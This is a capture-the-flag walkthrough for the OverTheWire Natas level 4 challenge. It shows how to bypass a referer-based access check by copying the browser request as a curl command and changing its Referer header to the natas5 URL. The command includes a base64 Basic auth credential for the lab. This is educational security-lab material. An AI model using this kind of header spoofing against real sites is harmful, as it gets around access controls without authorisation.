# Natas 4 walkthrough 

To complete this one we will need to understand referal links. Bascially its a link that 
the website can be accesed from, and only from that link. This partilucar website needs
a link which we dont have the access to, the ***natas5 login.*** After refreshing the 
page this information is shown:

>Access disallowed. You are visiting form ...natas4... while authorized users should come only from ...natas5...

Thats where we need to investigate.

---

## How to we change the refferal link?

There are many different options to change the refferal link. I will be using the terminal
way. Firstly, we need to actually find the refferal link.

1. Inspect the page. 
2. Navigate to the network tab.
3. Refresh the page.

By now you should see the `index.php` file. When clicking it, you can see the referal link.
Now, right clicking on this file select the ***copy value -> copy as cURL***. You should
have something like:
` curl 'http://natas4.natas.labs.overthewire.org/index.php' \
  --compressed \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en,pl;q=0.7,en-US;q=0.3' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Referer: http://natas4.natas.labs.overthewire.org/index.php' \
  -H 'Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR' \
  -H 'Connection: keep-alive' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'DNT: 1' \
  -H 'Sec-GPC: 1' \
  -H 'Priority: u=0, i' `

When pasted into the terminal, you get the message that you are trying to access from 
natas4, but it is only allowed to access from natas5. So naturally, we change the cURL from:

`
curl 'http://natas4.natas.labs.overthewire.org/index.php' \
  --compressed \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en,pl;q=0.7,en-US;q=0.3' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Referer: http://natas4.natas.labs.overthewire.org/index.php' \
  -H 'Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR' \
  -H 'Connection: keep-alive' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'DNT: 1' \
  -H 'Sec-GPC: 1' \
  -H 'Priority: u=0, i'
`

to:

`
curl 'http://natas4.natas.labs.overthewire.org/index.php' \
  --compressed \
  -H 'User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:139.0) Gecko/20100101 Firefox/139.0' \
  -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' \
  -H 'Accept-Language: en,pl;q=0.7,en-US;q=0.3' \
  -H 'Accept-Encoding: gzip, deflate' \
  -H 'Referer: http://natas5.natas.labs.overthewire.org' \
  -H 'Authorization: Basic bmF0YXM0OlFyeVpYYzJlMHphaFVMZEhydEh4enlZa2o1OWtVeExR' \
  -H 'Connection: keep-alive' \
  -H 'Upgrade-Insecure-Requests: 1' \
  -H 'DNT: 1' \
  -H 'Sec-GPC: 1' \
  -H 'Priority: u=0, i'
`

***Notice we changed the "referer" to natas5 AND deleted the /index.php***
After pasting that changed command into the terminal, you should be granted access.
